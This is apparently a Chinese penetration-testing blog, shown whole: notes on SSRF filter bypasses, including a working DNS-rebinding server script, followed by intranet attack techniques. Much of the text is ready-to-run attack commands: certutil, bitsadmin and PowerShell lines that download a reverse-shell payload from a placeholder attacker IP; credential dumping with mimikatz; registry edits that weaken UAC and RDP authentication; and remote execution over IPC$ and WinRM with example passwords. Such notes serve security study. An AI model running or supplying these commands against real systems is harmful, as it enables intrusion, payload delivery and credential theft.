<p>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </p>
<p>在浏览器使用的时候就可以正常识别</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412215511590.png"
                      alt="image-20230412215511590"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412215422527.png"
                      alt="image-20230412215422527"
                ></p>
<h6 id="URL十六进制编码"><a href="#URL十六进制编码" class="headerlink" title="URL十六进制编码"></a>URL十六进制编码</h6><p>URL十六进制编码可以被浏览器正常的识别</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412220233457.png"
                      alt="image-20230412220233457"
                ></p>
<h6 id="利用网址缩短"><a href="#利用网址缩短" class="headerlink" title="利用网址缩短"></a>利用网址缩短</h6><p>利用网址缩短的网站进行在线缩短</p>
<p><a class="link"   href="https://www.baidu.com/" >https://www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412220551851.png"
                      alt="image-20230412220551851"
                ></p>
<h6 id="利用30X重定向"><a href="#利用30X重定向" class="headerlink" title="利用30X重定向"></a>利用30X重定向</h6><p>可以利用重定向来让服务器访问目标地址，可用于重定向HTTP状态码：300 301 302 303 304 305 306 307 308</p>
<p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可以条状到内网中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">header(&quot;Location: http://192.168.1.10&quot;);</span><br><span class="line">exit(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>具体不太清楚</p>
<h6 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h6><p>配置域名的DNS解析到目标地址如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup 127.0.0.1.nip.io</span><br><span class="line">nslookup owasp.org.127.0.0.1.nip.io</span><br></pre></td></tr></table></figure></div>

<p>其中还有一个xip.io是一个开源的泛域名服务，会把如下域名解析到特定的地址，和DNS解析差不多</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class="line">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class="line">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class="line">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class="line">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure></div>

<h6 id="DNS重绑定（DNS-Rebinding）"><a href="#DNS重绑定（DNS-Rebinding）" class="headerlink" title="DNS重绑定（DNS Rebinding）"></a>DNS重绑定（DNS Rebinding）</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413164656866.png"
                      alt="image-20230413164656866"
                ></p>
<p>流程图中：对于用户的请求URL参数，首先服务器端会对其进行dns解析，然后返回解析过的域名，绕过不合法就丢弃，之后还会有一个URL请求</p>
<p>主要的原理就是利用这两次URL请求的时间差，来进行攻击的</p>
<p>利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候访问我们真正想要访问的内网IP就可以了</p>
<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名解析指定到我们自己的DNS Server，这样我们才可以编写解析服务，设置TTL时间为0（就是保存缓存的时间为0），这是为了防止有DNS服务器对第一次解析结果进行缓存</p>
<p>攻击流程</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器获得了URL参数，进行了第一次DNS解析，获得了一个非内网的IP</span><br><span class="line">对于获得的IP进行判断，发现这个是指定范围的IP，通过</span><br><span class="line">然后服务器端对URL进行访问，TTL设置为0，所以再次进行DNS解析，返回内网IP</span><br><span class="line">第一次的验证已经绕过，所以服务器端返回的就是内网的资源内容</span><br></pre></td></tr></table></figure></div>

<p>把同一个域名绑定到两个不同的IP地址，这就是两条A记录</p>
<p>但是这种具有随机性，你不太能可控，要取到第一次是外网IP，第二次是内网IP的可能组合有1&#x2F;4的概率</p>
<p>所以还有更好的方法，自己搭建一个DNS服务器</p>
<p>有一个A记录和一个NS记录</p>
<p>NS记录表示域名test.bendawang.site这个指定由ns.bendawang.site这个域名服务器来解析，然后A记录表示ns.bendawang.site的位置在IP104.160.43.154上</p>
<p>这需要我们自己搭建一个dns服务器</p>
<p>采用python的twisted库中的name模块就行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from twisted.internet import reactor, defer</span><br><span class="line">from twisted.names import client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&amp;#123;&amp;#125;</span><br><span class="line"></span><br><span class="line">class DynamicResolver(object):</span><br><span class="line"></span><br><span class="line">    def _doDynamicResponse(self, query):</span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        if name not in record or record[name]&lt;1:</span><br><span class="line">            ip=&quot;104.160.43.154&quot;</span><br><span class="line">        else:</span><br><span class="line">            ip=&quot;171.18.0.2&quot;</span><br><span class="line"></span><br><span class="line">        if name not in record:</span><br><span class="line">            record[name]=0</span><br><span class="line">        record[name]+=1</span><br><span class="line"></span><br><span class="line">        print name+&quot; ===&gt; &quot;+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=0,</span><br><span class="line">            payload=dns.Record_A(address=b&#x27;%s&#x27;%ip,ttl=0)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        return answers, authority, additional</span><br><span class="line"></span><br><span class="line">    def query(self, query, timeout=None):</span><br><span class="line">        return defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=&#x27;/etc/resolv.conf&#x27;)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(53, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    raise SystemExit(main())</span><br></pre></td></tr></table></figure></div>

<p>打包成 .py文件然后运行就行了</p>
<p>然后<code>dig test.bendawang.site</code></p>
<p>有一个在线的URL重绑定工具，第一种方法</p>
<p><code>https://lock.cmpxchg8b.com/rebinder.html</code></p>
<h4 id="SSRF工具"><a href="#SSRF工具" class="headerlink" title="SSRF工具"></a>SSRF工具</h4><h6 id="SSRF-Testing，绕过测试工具"><a href="#SSRF-Testing，绕过测试工具" class="headerlink" title="SSRF-Testing，绕过测试工具"></a>SSRF-Testing，绕过测试工具</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413173902801.png"
                      alt="image-20230413173902801"
                ></p>
<h6 id="SSRFmap"><a href="#SSRFmap" class="headerlink" title="SSRFmap"></a>SSRFmap</h6><p>这个工具可以根据模块来发送exp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413173558180.png"
                      alt="image-20230413173558180"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>内网安全</title>
    <url>/2023/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="基本认知"><a href="#基本认知" class="headerlink" title="基本认知"></a>基本认知</h2><h3 id="网站拓扑"><a href="#网站拓扑" class="headerlink" title="网站拓扑"></a>网站拓扑</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228154128442.png"
                      alt="image-20230228154128442"
                ></p>
<p>一般来说向外部提供服务的服务器存放于DMZ之中（如web服务器），其余较为核心的服务器在内网</p>
<h3 id="局域网、工作组、域环境"><a href="#局域网、工作组、域环境" class="headerlink" title="局域网、工作组、域环境"></a>局域网、工作组、域环境</h3><p>一般来说工作组和域环境的区别就是规模大小的局域网</p>
<p>工作组不存在管理主机，域环境存在便于管理，两者的攻击手法不同</p>
<h4 id="域控制器DC就是所谓的管理主机"><a href="#域控制器DC就是所谓的管理主机" class="headerlink" title="域控制器DC就是所谓的管理主机"></a>域控制器DC就是所谓的管理主机</h4><h4 id="活动目录AD"><a href="#活动目录AD" class="headerlink" title="活动目录AD"></a>活动目录AD</h4><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>分为</p>
<p>单域：只有一个域环境</p>
<p>父子域：相当于子公司和母公司的区别</p>
<p>​	注意：linux系统可以是域控制器，但是功能会比win系统少，且难以管理，所以一般来说域控制器都是用win的系统来实现，linux一般用作服务器</p>
<p>域的组成</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228160643006.png"
                      alt="image-20230228160643006"
                ></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>作用：为了了解到当前服务器的计算机的基本信息，为后续判断都武器角色，网络     环境等做准备。</p>
<p>systeminfo  查看当前已经取得权限主机的详细信息</p>
<p>net start  查看启动的服务</p>
<p>tasklist   进程列表</p>
<p>schtasks 计划任务</p>
<p>判断是否存在域：</p>
<p>ipconfig&#x2F;all</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228163534013.png"
                      alt="image-20230228163534013"
                ></p>
<p>net view &#x2F;domain</p>
<p>判断主域（获取域控的地址）</p>
<p>net time &#x2F;domain</p>
<p>判断当前网络端口开放</p>
<p>netstat -ano</p>
<p>域名 追踪来源地址</p>
<p>nslookup</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228164903139.png"
                      alt="image-20230228164903139"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228165049553.png"
                      alt="image-20230228165049553"
                ></p>
<h3 id="凭据信息收集"><a href="#凭据信息收集" class="headerlink" title="凭据信息收集"></a>凭据信息收集</h3><p>为了收集各种密文、明文、口令等，为后续的横向渗透做好准备</p>
<h4 id="mimikatz（适用于win）的使用"><a href="#mimikatz（适用于win）的使用" class="headerlink" title="mimikatz（适用于win）的使用"></a>mimikatz（适用于win）的使用</h4><p>可以使用该工具收集用户的账号和密码信息，但是域用户会有权限限制该工具的使用，这时候就涉及提权操作，如下图</p>
<p>管理员方式  运行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228225649556.png"
                      alt="image-20230228225649556"
                ></p>
<h4 id="LaZagne（all），XenArmor（win）"><a href="#LaZagne（all），XenArmor（win）" class="headerlink" title="LaZagne（all），XenArmor（win）"></a>LaZagne（all），XenArmor（win）</h4><h4 id="计算机各种协议服务口令获取（获取本地计算机的各种软件密码）"><a href="#计算机各种协议服务口令获取（获取本地计算机的各种软件密码）" class="headerlink" title="计算机各种协议服务口令获取（获取本地计算机的各种软件密码）"></a>计算机各种协议服务口令获取（获取本地计算机的各种软件密码）</h4><h2 id="后续探针"><a href="#后续探针" class="headerlink" title="后续探针"></a>后续探针</h2><h4 id="探针域控制器及地址信息"><a href="#探针域控制器及地址信息" class="headerlink" title="探针域控制器及地址信息"></a>探针域控制器及地址信息</h4><p>信息收集讲过</p>
<h4 id="探针域内存活主机及地址信息"><a href="#探针域内存活主机及地址信息" class="headerlink" title="探针域内存活主机及地址信息"></a>探针域内存活主机及地址信息</h4><p> nbtscan 192.168.3.0&#x2F;24 第三方工具，不推荐，可能被杀</p>
<p>for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”   自带命令探寻主机</p>
<h5 id="powershell脚本nishang工具"><a href="#powershell脚本nishang工具" class="headerlink" title="powershell脚本nishang工具"></a>powershell脚本nishang工具</h5><p>  —导入模块 nishang：Import-Module .\nishang.psm1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/eb5ba3f79d96eb0da2f8ed1d3bdc394277e99a40.png@831w_122h_progressive.webp"
                      alt="img"
                ></p>
<p>#设置执行策略（第一次运行先设置执行策略，这里还是权限不够）</p>
<p>—Set-ExecutionPolicy RemoteSigned</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9deacbf8ab0e310f7b0d09f0562d35d754dff5e2.png@831w_249h_progressive.webp"
                      alt="img"
                ></p>
<p>—以管理员运行powershell，注意这里的密码是DC的密码才行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/18d929307e6e535f289dc3c0c23c6a43b948ddfd.png@831w_335h_progressive.webp"
                      alt="img"
                ></p>
<p>—设置执行策略（首次执行nishang）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9cc6070cb110b2453cdb03faef7384e604d67304.png@831w_162h_progressive.webp"
                      alt="img"
                ></p>
<p>—导入模块</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/41ad41f293fa81f4ce4bf390c57f341530a7e8a0.png@831w_189h_progressive.webp"
                      alt="img"
                ></p>
<p>#获取模块 nishang 的命令函数</p>
<p>—Get-Command -Module nishang（每个参数对应一个功能模块）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/65b8cd453110a0bcc587ae3f5c172eadbfcc4a9a.png@831w_243h_progressive.webp"
                      alt="img"
                ></p>
<p>—调用Invoke-Mimikatz的功能（查询本地windows账号密码）</p>
<p>—这里发现了域控（Administrator）的密码、域用户（webadmin）密码和本地管理员用户（Administrator）密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/47773cafd9fafa040b26a7558a9dd85baf3db1fa.png@831w_392h_progressive.webp"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/16710e3db0474f31cc7fe2a29a431bb18250f1db.png@698w_299h_progressive.webp"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/05194c13133762cdee5b81012974ee3405ce88ab.png@831w_393h_progressive.webp"
                      alt="img"
                >![img](<a class="link"   href="https://i0.hdslb.com/bfs/article/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp" >https://i0.hdslb.com/bfs/article/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>#获取常规计算机信息：Get-Information</p>
<p>—登录用户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp"
                      alt="img"
                ></p>
<p>—安装的应用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9b52aa996b4c90817f4769d5adb931cc67cc64f6.png@831w_417h_progressive.webp"
                      alt="img"
                ></p>
<p>—启用的服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/fd6cee535ee4bd239ea92d167a0bd8597f0e769d.png@725w_216h_progressive.webp"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301132837623.png"
                      alt="image-20230301132837623"
                ></p>
<p>Invoke-Portscan -startAddress 192.168.3.0  -EndAddress 192.168.3.100 -ResolveHost -ScanPort</p>
<p>Invoke-CredentialsPhish弹出密码登入框，不输对不给关</p>
<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="横向移动中的文件传输"><a href="#横向移动中的文件传输" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h3><h4 id="通过网络共享"><a href="#通过网络共享" class="headerlink" title="通过网络共享"></a>通过网络共享</h4><p>Windows的网络共享功能能实现局域网之间的文件共享</p>
<p>执行net share可以开启网络共享，其中C$是C盘共享，Admin$是目录共享</p>
<h6 id="IPC-共享"><a href="#IPC-共享" class="headerlink" title="IPC$共享"></a>IPC$共享</h6><p>条件：远程主机开启了ipc连接        139和445端口要开放</p>
<p>执行</p>
<p><code>net use \\10.10.10.19\IPC$ &quot;Admin123&quot;  /user :&quot;Administrator&quot;</code>实现IPC连接</p>
<p><code>dir \\110.10.10.19</code>实现C盘共享目录</p>
<p><code>copy .\reverse_tcp.exe \\10.10.10.19\C$</code>复制文件到远程主机的C盘</p>
<p>使用其他的命令也可以达到不同的效果</p>
<p>如：<code>net use \\10.10.10.19\C$ &quot;Admin@123&quot; /user:&quot;Administrator&quot;</code>建立远程C$共享</p>
<h4 id="通过搭建SMB服务器"><a href="#通过搭建SMB服务器" class="headerlink" title="通过搭建SMB服务器"></a>通过搭建SMB服务器</h4><p>SMB又称CIFS（网络文件共享系统）</p>
<p>是计算机能共享文件、打印机、等资源，利用应用层tcp传输，端口139、445偏向445</p>
<p>可以在服务器中搭建SMB共享服务器，并将攻击载荷放入共享文件夹，使远程主机能够远程加载共享文件（主义使用匿名共享）</p>
<p>可以利用impacket中的smbserver.py来实现SMB服务器的搭建</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行以下命令即可</span><br><span class="line">mkdir  /root/share</span><br><span class="line">python smbserver.py evilsmb /root/share -smb2support</span><br></pre></td></tr></table></figure></div>

<p>对于Windows，已经获得管理员权限的可以直接手动配置一个SMB服务器</p>
<p>也可以通过Invoke-BuildAnonymousSMBServer在本地快速启动一个匿名共享。</p>
<h4 id="通过Windows自带的工具"><a href="#通过Windows自带的工具" class="headerlink" title="通过Windows自带的工具"></a>通过Windows自带的工具</h4><h6 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h6><p>Certutil是一个Windows自带的命令行工具，用于管理证书安装，提供了从网络下载文件的功能，可以先在服务器上部署攻击载荷然后下载下来</p>
<p>执行</p>
<p><code>certutil -urlcache -split -f http://你的IP:端口port/shell.exe C:\reverse_tcp.exe</code></p>
<p>通过Certutil下载shell.exe，并保存在C:\reverse_tcp.exe</p>
<h6 id="BITSAdmin"><a href="#BITSAdmin" class="headerlink" title="BITSAdmin"></a>BITSAdmin</h6><p>Bitsadmin是一个命令行工具可以用来创建、下载、上载作业，监视进度</p>
<p><code>bitsadmin \transfer test http://你的IP:端口port/shell.exe C:\reverse_tcp.exe</code></p>
<p>创建一个名为test的Bitsadmin任务，保存shell.exe到C:\reverse_tcp.exe</p>
<h6 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h6><p>可以利用WebClient来实现文件下载</p>
<p><code>(New-Object Net.WebClient).DownloadFile(&#39;http://你的IP:端口port/shell.exe&#39;,&#39;C:\reverse_tcp.exe&#39;)</code></p>
<h3 id="UAC-Remote-Restrictions"><a href="#UAC-Remote-Restrictions" class="headerlink" title="UAC Remote Restrictions"></a>UAC Remote Restrictions</h3><p>UAC是用户账户控制，这使计算机能以非管理员模式运行，本地中如何非RID 500的其他用户都以最小权限运行。</p>
<p>为了更好的保护属于本地管理员成员的用户，微软在Windows vista之后引入UAC Remote Restrictions远程限制</p>
<p>这个东西会导致schtasks、PsExec、WMI、WinRM、哈希传递攻击都只能使用RID 500的本地管理员用户，其他用户包括非RID 500的本地管理员用户都会提示“拒绝访问”</p>
<p>从而限制横向移动</p>
<p>关闭</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></div>



<h3 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h3><p>查询是否开启远程桌面</p>
<p><code>reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server&quot; /v fDenyTSConnections</code></p>
<p>0没启动 1启动</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#本地开启远程桌面功能</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">#关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server\WinStations\RDP-TCP&quot; /v UserAuthentication /t REG_Dword /d 0</span><br><span class="line">#设置防火墙策略放行3389端口</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">#对于远程主机可以使用WMI来开启远程桌面</span><br><span class="line">wmic /Node:10.10.10.19 /User:Administrator /Pssword:Admin@123 RDTOGGLE WHERE ServerName=&#x27;WIN2016-WEB3&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure></div>

<h6 id="RDP-Hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h6><p>原理是，当有多个用户使用远程桌面时，就会产生多个RDP会话，并且可以在未授权的情况下成功登入目标系统，即使用户会话已经断开</p>
<p>需要获取SYSTEM权限，正常来说需要密码，但是已经获取了 SYSTEM权限就可以不用密码</p>
<p>操作：在Meterpreter中提权至SYSTEM权限后执行<code>tscon 9</code>即可</p>
<h6 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h6><p>SharpRDP是一款开源工具，需要3389端口，可以在远程主机上执行系统命令，不需要GUI</p>
<p>可以直接将SharpRDP上传到跳板机。然后获取用户凭据，对内网其他主机执行系统命令，就省去代理等中间环节</p>
<h3 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用"></a>WinRM的利用</h3><h4 id="执行远程命令"><a href="#执行远程命令" class="headerlink" title="执行远程命令"></a>执行远程命令</h4><p>有两个命令工具：</p>
<p>1.Winrs远程执行命令 </p>
<p>远程管理的客户端程序，提供凭据即可运行，但需要双方都有winrm服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行以下命令，可以执行以下命令</span><br><span class="line">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;whoami&quot;</span><br><span class="line">可以通过这个开启目标的cmd</span><br><span class="line">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;cmd&quot;</span><br></pre></td></tr></table></figure></div>



<p>2.Winrm（.cmd）系统管理命令行工具</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过调用Win32_Process类中的Create方法来创建远程进程</span><br><span class="line">实战中可以执行一个攻击载荷</span><br><span class="line">winem invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @&#123;commandline=&quot;notepad.exe&quot;&#125; -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123</span><br></pre></td></tr></table></figure></div>

<h4 id="利用WinRM获取交互式会话"><a href="#利用WinRM获取交互式会话" class="headerlink" title="利用WinRM获取交互式会话"></a>利用WinRM获取交互式会话</h4><h6 id="powershell利用"><a href="#powershell利用" class="headerlink" title="powershell利用"></a>powershell利用</h6><p>powershell的远程传输协议基于WinRM规范，且可以远程管理</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定远程的用户名</span><br><span class="line">$User = &quot;HACK-MY\Administrator&quot;</span><br><span class="line">指定用户密码</span><br><span class="line">$password = ConverTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class="line">将用户名和密码整合，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line">根据提供的凭据创建会话</span><br><span class="line">New-PSSession -Name（指定的创建会话名称） WinRM1 -ComputerName（指定要连接的主机IP或主机名） 10.10.10.19 -Credential（指定有权连接到远程主机的用户凭据） $Cred -Port（指定WinRM的工作端口） 5985</span><br></pre></td></tr></table></figure></div>

<p><code>Get-PSSession</code>查看当前已经创建的PSSession会话</p>
<p>选中一个会话并且执行<code>Enter-PSSession -Name WinRM1</code>进入会话交互模式</p>
<p>也可以通过Invoke-Command执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定远程的用户名</span><br><span class="line">$User = &quot;HACK-MY\Administrator&quot;</span><br><span class="line">指定用户密码</span><br><span class="line">$password = ConverTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class="line">将用户名和密码整合，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line">根据提供的凭据创建会话</span><br><span class="line">$Sess = New-PSSession -Name（指定的创建会话名称） WinRM1 -ComputerName（指定要连接的主机IP或主机名） 10.10.10.19 -Credential（指定有权连接到远程主机的用户凭据） $Cred -Port（指定WinRM的工作端口） 5985</span><br><span class="line">在创建的会话中执行命令</span><br><span class="line">Invoke-Command -Session $Sess -ScriptBlock &#123; dir c:\&#125;</span><br></pre></td></tr></table></figure></div>

<h6 id="Evil-Winrm"><a href="#Evil-Winrm" class="headerlink" title="Evil-Winrm"></a>Evil-Winrm</h6><p>Evil-winrm是一种基于Winrm Shell的渗透架构，可以通过提供用户名密码和哈希值在启用了WinRM服务的目标主机上完成的简单的攻击任务</p>
<h4 id="域横向批量at-amp-schtasks-amp-impacket"><a href="#域横向批量at-amp-schtasks-amp-impacket" class="headerlink" title="域横向批量at&amp;schtasks&amp;impacket"></a>域横向批量at&amp;schtasks&amp;impacket</h4><h5 id="横向渗透明文传递at-amp-schtasks"><a href="#横向渗透明文传递at-amp-schtasks" class="headerlink" title="横向渗透明文传递at&amp;schtasks"></a>横向渗透明文传递at&amp;schtasks</h5><p>在拿下一台内网主机之后，通过本地信息收集用户凭证信息之后，应该如何很横向渗透拿下更多的主机，这里就涉及到at&amp;schtasks命令的使用，在一直目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令</p>
<p>主要步骤：获取到某域主机权限-&gt;mimikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表做字典 -&gt;用到密码明文当作密码字典-&gt;尝试连接–&gt;穿甲计划任务（at&amp;schtasks）-&gt;执行文件可为后门或者相关命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301145205438.png"
                      alt="image-20230301145205438"
                ></p>
<p>IPC建立失败原因</p>
<p>对方未开启139，445端口等</p>
<p>—dir \xx.xx.xx.xx\C$\ # 查看文件列表</p>
<p>—copy \xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件</p>
<p>—copy 1.bat \xx.xx.xx.xx\C$ # 复制文件</p>
<p>—net use \xx.xx.xx.xx\C$\1.bat &#x2F;del # 删除 IPC</p>
<p>—net view xx.xx.xx.xx # 查看对方共享</p>
